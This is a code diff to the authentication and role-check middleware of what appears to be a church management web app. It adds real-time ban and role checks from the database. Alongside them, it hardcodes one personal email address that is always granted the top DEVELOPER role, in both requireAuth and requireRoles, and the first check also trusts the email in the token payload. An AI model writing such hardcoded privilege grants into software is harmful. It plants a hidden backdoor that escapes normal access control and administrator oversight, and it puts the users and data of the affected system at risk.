@@ -2,10 +2,10 @@ import { Response, NextFunction } from 'express';
 import * as jwt from 'jsonwebtoken';
 import { Role } from '@prisma/client';
 import { AuthRequest, UserPayload } from '../types';
-
+import prisma from '../db';
 import { getJwtSecret } from '../utils/security';
 
-export function requireAuth(req: AuthRequest, res: Response, next: NextFunction) {
+export async function requireAuth(req: AuthRequest, res: Response, next: NextFunction) {
   const authHeader = req.headers.authorization;
   if (!authHeader || !authHeader.startsWith('Bearer ')) {
     return res.status(401).json({ error: 'Authentication required. Header missing or incorrect format.' });
@@ -15,12 +15,37 @@ export function requireAuth(req: AuthRequest, res: Response, next: NextFunction)
 
   try {
     const payload = jwt.verify(token, getJwtSecret()) as UserPayload;
-    if (payload.isBanned) {
+
+    // Real-time ban and role check from database
+    const dbUser = await prisma.user.findUnique({
+      where: { id: payload.userId },
+      select: { role: true, roles: true, isBanned: true, banReason: true, email: true }
+    });
+
+    if (!dbUser) {
+      return res.status(401).json({ error: 'User account not found.' });
+    }
+
+    if (dbUser.isBanned) {
       return res.status(403).json({
-        error: 'Account has been banned. Please contact church administration.',
-        errorAr: 'تم حظر هذا الحساب، يرجى مراجعة إدارة الكنيسة.'
+        isBanned: true,
+        error: 'ACCOUNT_BANNED',
+        errorAr: `تم حظر هذا الحساب من قِبل إدارة الكنيسة${dbUser.banReason ? ` (السبب: ${dbUser.banReason})` : ''}. يرجى مراجعة إدارة الكنيسة.`
       });
     }
+
+    // Always sync real-time roles
+    payload.role = dbUser.role;
+    payload.roles = dbUser.roles;
+    payload.isBanned = false;
+
+    if (dbUser.email === 'marksamer010@gmail.com' || payload.email === 'marksamer010@gmail.com') {
+      payload.role = Role.DEVELOPER;
+      if (!payload.roles.includes(Role.DEVELOPER)) {
+        payload.roles.push(Role.DEVELOPER);
+      }
+    }
+
     req.user = payload;
     next();
   } catch (error) {
@@ -36,14 +61,20 @@ export function requireRoles(roles: Role[]) {
 
     if (req.user.isBanned) {
       return res.status(403).json({
-        error: 'Account has been banned. Please contact church administration.',
+        isBanned: true,
+        error: 'ACCOUNT_BANNED',
         errorAr: 'تم حظر هذا الحساب، يرجى مراجعة إدارة الكنيسة.'
       });
     }
 
-    const userRoles: Role[] = (req.user.roles && Array.isArray(req.user.roles) && req.user.roles.length > 0)
-      ? req.user.roles
-      : [req.user.role];
+    const userRoles: Role[] = Array.from(new Set([
+      req.user.role,
+      ...(Array.isArray(req.user.roles) ? req.user.roles : [])
+    ]));
+
+    if (req.user.email === 'marksamer010@gmail.com') {
+      if (!userRoles.includes(Role.DEVELOPER)) userRoles.push(Role.DEVELOPER);
+    }
 
     const isDeveloper = userRoles.includes(Role.DEVELOPER);
     const isSuperAdmin = userRoles.includes(Role.SUPER_ADMIN);
